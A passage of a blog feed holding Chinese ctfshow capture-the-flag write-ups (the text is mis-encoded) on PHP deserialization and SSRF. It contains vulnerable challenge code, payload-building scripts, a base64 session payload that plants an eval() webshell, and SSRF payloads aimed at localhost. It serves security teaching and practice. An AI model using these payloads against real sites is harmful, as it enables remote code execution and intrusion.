<h2 id="web262-å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web262-å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="web262 å­—ç¬¦ä¸²é€ƒé€¸"></a>web262 å­—ç¬¦ä¸²é€ƒé€¸</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>è®¿é—®url&#x2F;message.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));</span><br><span class="line">    if($msg-&gt;token==&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ åºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class message&#123;</span><br><span class="line"> </span><br><span class="line">public $token=&#x27;admin&#x27;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a=new message();</span><br><span class="line"> </span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web263sessionååºåˆ—åŒ–æ¼æ´"><a href="#web263sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web263sessionååºåˆ—åŒ–æ¼æ´"></a>web263sessionååºåˆ—åŒ–æ¼æ´</h2><p><a href="https://www.jb51.net/article/116246.htm">æ·±å…¥æµ…æPHPçš„sessionååºåˆ—åŒ–æ¼æ´é—®é¢˜_phpå®ä¾‹_è„šæœ¬ä¹‹å®¶ (jb51.net)</a></p>
<p><a href="https://www.cnblogs.com/meng-han/p/16851760.html">ctfshow web263(PHPçš„sessionååºåˆ—åŒ–æ¼æ´) - hithub - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°<a href="http://www.zipæ–‡ä»¶,è®¿é—®ä¸‹è½½ä¸‹æ¥æ˜¯ç½‘ç«™æºç ./">www.zipæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½ä¸‹æ¥æ˜¯ç½‘ç«™æºç ã€‚</a></p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>check.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &#x27;inc/inc.php&#x27;;</span><br><span class="line">$GET = array(&quot;u&quot;=&gt;$_GET[&#x27;u&#x27;],&quot;pass&quot;=&gt;$_GET[&#x27;pass&#x27;]);</span><br><span class="line">if($GET)&#123;</span><br><span class="line"></span><br><span class="line">	$data= $db-&gt;get(&#x27;admin&#x27;,</span><br><span class="line">	[	&#x27;id&#x27;,</span><br><span class="line">		&#x27;UserName0&#x27;</span><br><span class="line">	],[</span><br><span class="line">		&quot;AND&quot;=&gt;[</span><br><span class="line">		&quot;UserName0[=]&quot;=&gt;$GET[&#x27;u&#x27;],</span><br><span class="line">		&quot;PassWord1[=]&quot;=&gt;$GET[&#x27;pass&#x27;] //å¯†ç å¿…é¡»ä¸º128ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	if($data[&#x27;id&#x27;])&#123;</span><br><span class="line">		//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span><br><span class="line">		$_SESSION[&#x27;limit&#x27;]= 0;</span><br><span class="line">		echo json_encode(array(&quot;success&quot;,&quot;msg&quot;=&gt;&quot;æ¬¢è¿æ‚¨&quot;.$data[&#x27;UserName0&#x27;]));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;])+1);</span><br><span class="line">		echo json_encode(array(&quot;error&quot;,&quot;msg&quot;=&gt;&quot;ç™»é™†å¤±è´¥&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line">session_start();</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payloadï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);</span><br><span class="line">$res=&quot;|&quot;.serialize($user);</span><br><span class="line">echo $res;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQoK</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…æ”¹limitå€¼</p>
<p>è®¿é—®check.phpå®ç°ååºåˆ—åŒ–shellçš„å†™å…¥ï¼Œä¼šå†™åˆ°æ ¹ç›®å½•æŒºå¥‡æ€ªçš„</p>
<p>url&#x2F;log-1.php</p>
<p>èšå‰‘è¿æ¥</p>
<h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;<span class="comment">//ä½¿token=password å¾—return 1; echo flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tokençš„å€¼ç­‰äºä¸€ä¸ªéšæœºæ•°ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshowAdmin</span><br><span class="line">&#123;</span><br><span class="line">    public $password;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;password = &amp;$this-&gt;token;</span><br><span class="line">    &#125;//ä¸èƒ½ç›´æ¥ç­‰äº</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfshowAdmin();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>å¼•ç”¨ï¼ˆ&amp;ï¼‰çš„ç”¨æ³•å’Œåº”ç”¨</p>
<p>åœ¨PHP ä¸­å¼•ç”¨çš„æ„æ€æ˜¯ï¼š<strong>ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹</strong></p>
<p><a href="https://www.cnblogs.com/alsf/p/9621362.html">https://www.cnblogs.com/alsf/p/9621362.html</a></p>
<p>ctfshow{b3af121a-ce30-4452-a80f-9701f229041c}</p>
<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;CTFSHOW&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>PHPç‰¹æ€§ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå˜é‡ååŒºåˆ†ã€‚</p>
<p>ç»è¿‡å°è¯•hackbar,ä¸èƒ½post  php:&#x2F;&#x2F;input,é™¤äº†max hackbar,ä¼ å‚å¾—åˆ°</p>
<p>ctfshow{2769a98f-097f-4919-aa09-f64ef83591dd}</p>
<h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2>]]></content>
      <categories>
        <category>web</category>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_ssrf</title>
    <url>/2023/02/02/ctfshow-ssrf/</url>
    <content><![CDATA[<p>ssrfä»‹ç»ä»¥åŠctfshow_ssrfé¢˜</p>
 <span id="more"></span>

<h2 id="1ã€SSRFæ¼æ´ç®€ä»‹ï¼š"><a href="#1ã€SSRFæ¼æ´ç®€ä»‹ï¼š" class="headerlink" title="1ã€SSRFæ¼æ´ç®€ä»‹ï¼š"></a>1ã€SSRF<a href="https://javaforall.cn/tag/%E6%BC%8F%E6%B4%9E">æ¼æ´</a>ç®€ä»‹ï¼š</h2><p>SSRFå…¨ç§°ï¼šServer-Side Request Forgeryï¼Œå³ï¼Œ<a href="https://cloud.tencent.com/product/cvm?from=10680">æœåŠ¡å™¨</a>ç«¯è¯·æ±‚ä¼ªé€ ã€‚æ˜¯ä¸€ä¸ªç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œåœ¨ç›®æ ‡æœåŠ¡ç«¯æ‰§è¡Œçš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä½¿æœåŠ¡å™¨ç«¯å‘æ”»å‡»è€…æ„é€ çš„ä»»æ„åŸŸå‘å‡ºè¯·æ±‚ï¼Œç›®æ ‡é€šå¸¸æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚</p>
<h2 id="2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š"><a href="#2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š" class="headerlink" title="2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š"></a>2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š</h2><p>å½“æ”»å‡»è€…æƒ³è¦è®¿é—®æœåŠ¡å™¨Bä¸Šçš„æœåŠ¡ï¼Œä½†æ˜¯ç”±äºå­˜åœ¨é˜²ç«å¢™æˆ–è€…æœåŠ¡å™¨Bæ˜¯å±äºå†…ç½‘ä¸»æœºç­‰åŸå› å¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ã€‚å¦‚æœæœåŠ¡å™¨Aå­˜åœ¨SSRFæ¼æ´ï¼Œè¿™æ—¶æ”»å‡»è€…å¯ä»¥å€ŸåŠ©æœåŠ¡å™¨Aæ¥å‘èµ·SSRFæ”»å‡»ï¼Œé€šè¿‡æœåŠ¡å™¨Aå‘ä¸»æœºBå‘èµ·è¯·æ±‚ï¼Œè¾¾åˆ°æ”»å‡»å†…ç½‘çš„ç›®çš„ã€‚</p>
<p>DNSåè®®æ˜¯ç”¨æ¥å°†åŸŸåè½¬æ¢ä¸ºIPåœ°å€ï¼ˆä¹Ÿå¯ä»¥å°†IPåœ°å€è½¬æ¢ä¸ºç›¸åº”çš„åŸŸååœ°å€ï¼‰</p>
 <!--more-->

<h5 id="urlæ ¼å¼"><a href="#urlæ ¼å¼" class="headerlink" title="urlæ ¼å¼"></a>urlæ ¼å¼</h5><p><a href="https://baike.baidu.com/item/URL%E6%A0%BC%E5%BC%8F/10056474?fr=aladdin">URLæ ¼å¼_ç™¾åº¦ç™¾ç§‘ (baidu.com)</a></p>
<p>åè®®ç±»å‹:&#x2F;&#x2F;æœåŠ¡å™¨åœ°å€[:ç«¯å£å·]&#x2F;è·¯å¾„&#x2F;æ–‡ä»¶å[å‚æ•°&#x3D;å€¼]ã€‚</p>
<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">//è¿™ä¸‰ä¸ªå‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆssrflæ¼æ´</span></span><br></pre></td></tr></table></figure>

<h5 id="curlåº“"><a href="#curlåº“" class="headerlink" title="curlåº“"></a>curlåº“</h5><p>curlæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œåˆ©ç”¨è¯¥æ‰©å±•å¯ä»¥å®ç°æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®æˆ–æ–‡ä»¶ä¼ è¾“</p>
<p><a href="https://www.php.net/manual/zh/book.curl.php">https://www.php.net/manual/zh/book.curl.php</a></p>
<h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ç”¨ cURL å‡½æ•°çš„åŸºæœ¬æ€æƒ³æ˜¯å…ˆä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.curl-init.php">curl_init()</a> åˆå§‹åŒ– cURLä¼šè¯ï¼Œæ¥ç€å¯ä»¥é€šè¿‡ <a href="https://www.php.net/manual/zh/function.curl-setopt.php">curl_setopt()</a> è®¾ç½®éœ€è¦çš„å…¨éƒ¨é€‰é¡¹ï¼Œç„¶åä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.curl-exec.php">curl_exec()</a> æ¥æ‰§è¡Œä¼šè¯ï¼Œå½“æ‰§è¡Œå®Œä¼šè¯åä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.curl-close.php">curl_close()</a> å…³é—­ä¼šè¯ã€‚</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{fa1bbf25-b061-4ed6-bbde-a1c388eb367e}</p>
<h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">/*æœ¬å‡½æ•°ä¸æ˜¯ç”¨æ¥éªŒè¯ç»™å®š URL çš„æœ‰æ•ˆæ€§çš„ï¼Œåªæ˜¯å°†å…¶åˆ†è§£ä¸ºä¸‹é¢åˆ—å‡ºçš„éƒ¨åˆ†ã€‚ä¹Ÿä¼šæ¥å—ä¸å®Œæ•´æˆ–æ— æ•ˆçš„ URLï¼Œparse_url() ä¼šå°è¯•å°½é‡æ­£ç¡®è§£æ*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<p>parse_url()å‡½æ•°</p>
<p> schemeâ€”â€”å¦‚ http  ,         host  ,        port  ,         user       ,      pass       ,    path         ,</p>
<p>  queryâ€”â€”åœ¨é—®å· <code>?</code> ä¹‹å         .</p>
<p>  fragmentâ€”â€”åœ¨æ³¨é‡Šç¬¦å· <code>#</code> ä¹‹å         </p>
<p><a href="https://www.php.net/manual/zh/function.parse-url">https://www.php.net/manual/zh/function.parse-url</a></p>
<p>ä¸Šé¢˜payloadä¾æ—§å¯ç”¨</p>
<p><code> </code>ctfshow{2152a6a2-ee73-4272-9d80-7a7bf43591c2}</p>
<h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span 